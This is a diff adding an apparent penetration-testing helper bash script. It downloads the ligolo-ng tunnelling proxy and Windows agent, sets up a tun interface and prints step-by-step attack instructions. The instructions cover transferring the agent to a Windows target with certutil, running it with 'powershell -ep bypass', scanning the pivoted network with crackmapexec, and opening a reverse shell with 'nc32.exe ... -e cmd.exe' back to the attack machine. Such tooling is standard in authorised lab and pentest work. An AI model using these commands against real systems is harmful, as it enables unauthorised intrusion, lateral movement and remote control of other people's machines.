@@ -1,0 +1,68 @@
+#!/bin/bash
+
+# RED color outline
+RED="\e[31m"
+GREEN="\e[32m"
+ENDCOLOR="\e[0m"
+
+# Check arguments
+if [ $# -eq 0 ]
+  then
+    echo "No arguments supplied. Please supply a valid target IP address"
+    exit
+fi
+
+# Get the current VPN IP Address
+ip=`ip addr show tun0 | grep -v 'inet6' | grep inet | awk -F " " '{print $2}' | awk -F "/" '{print $1}'`
+
+
+# Exit script if user presses CTRL C
+trap "exit" INT
+
+# Download ligolo-ng
+wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz && [ -f ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz ] &&  (printf "[x] Downloaded ligolo-ng proxy (Linux)\n") || printf "[-] Download issue. ligolo-ng proxy (Linux) not downloaded\n"
+
+# Download ligolo-ng agent for windows
+wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Windows_64bit.zip && [ -f ligolo-ng_agent_0.4.3_Windows_64bit.zip  ] &&  (printf "[x] Downloaded ligolo-ng agent (Windows)\n") || printf "[-] Download issue. ligolo-ng agent (Windows) not downloaded\n"
+
+
+# Unpack ligolo-ng proxy
+tar xzf ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz && [ -f proxy ] && printf "[x] Proxy executable extraced\n" && rm -rf LICENSE README.md && rm -rf ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz
+
+# Unpack ligolo-ng agent
+unzip ligolo-ng_agent_0.4.3_Windows_64bit.zip  && [ -f agent.exe ] && printf "[x] Agent executable extraced\n" && rm -rf LICENSE README.md && rm -rf ligolo-ng_agent_0.4.3_Windows_64bit.zip
+
+
+# Create network interface for ligolo-ng on attack machine
+## Delete ligolo interface if interface already exists and create a new one
+printf "[x] Creating ligolo network interface...\n" && sudo ip tuntap add user kali mode tun ligolo
+sudo ip link set ligolo up
+
+# Instructions on how to setup a network pivot
+printf "\n\n\n\n${GREEN}[!] Instructions for Adding a Pivot [!]${ENDCOLOR}\n"
+printf "1. Transfer agent.exe to the Windows target by running this on Windows target: ${RED}\ncertutil -urlcache -split -f http://$1:443/agent.exe${ENDCOLOR}\n"
+printf "2. Activate agent.exe on the Windows target: ${RED}\npowershell -ep bypass -c 'agent.exe -connect $ip:11601 -ignore-cert'${ENDCOLOR}\n"
+printf "3. After the agent connects to our machine, display network interfaces we want to pivot to in the proxy shell: ${RED}\nifconfig${ENDCOLOR}\n"
+printf "4. Add the network interface IP range we want to add from the ifconfig output: ${RED}\nsudo ip route x.x.x.0/24 dev ligolo && ip route list${ENDCOLOR}\n"
+printf "5. Start the pivot on the ligolo proxy shell on our attack machine: ${RED}\nstart${ENDCOLOR}\n"
+printf "6. Confirm that network pivot works ${RED}\ncrackmapexec smb x.x.x.x/24${ENDCOLOR}"
+
+# Instructions on setting up reverse shell listener
+printf "\n\n\n\n${GREEN}[!] Instructions for Adding a reverse shell listener [!]${ENDCOLOR}\n"
+printf "1. Add a listener in the ligolo proxy shell:  ${RED}\nlistener add --addr 0.0.0.0:8443 --to 127.0.0.1:8443${ENDCOLOR}\n"
+printf "2. List listeners to confirm listener creation: ${RED}\nlistener_list${ENDCOLOR}\n"
+printf "3. Create listener on attack machine. Reverse shell will be forwarded from port 8443 on pivoted machine to port 8443 on our attack machine: ${RED}\nsudo rlwrap ncat -nvlp 8443${ENDCOLOR}\n"
+printf "4. Send reverse shell on the target machine: ${RED}\nnc32.exe $1 8443 -e cmd.exe${ENDCOLOR}\n"
+printf "5. Observe a reverse shell"
+
+# Instructions on setting up file transfer listener
+printf "\n\n\n\n${GREEN}[!] Instructions for Adding a file transfer listener [!]${ENDCOLOR}\n"
+printf "1. Add a listener in the ligolo proxy shell:  ${RED}\nlistener add --addr 0.0.0.0:4445 --to 127.0.0.1:4445${ENDCOLOR}\n"
+printf "2. List listeners to confirm listener creation: ${RED}\nlistener_list${ENDCOLOR}\n"
+printf "3. Create python http server on attack machine: ${RED}\npython3 -m http.server 4445${ENDCOLOR}\n"
+printf "4. Download file using pivoted machine IP. A hit to port 4445 on the pivoted machine will forward traffic to 4445 on our attack machine:${RED}\ncertutil -urlcache -split -f http://$1:4445/nc32.exe${ENDCOLOR}\n"
+printf "5. Observe a hit on port 4445 on our python webserver"
+
+# Start ligolo proxy but push it in the background
+./proxy -selfcert
+
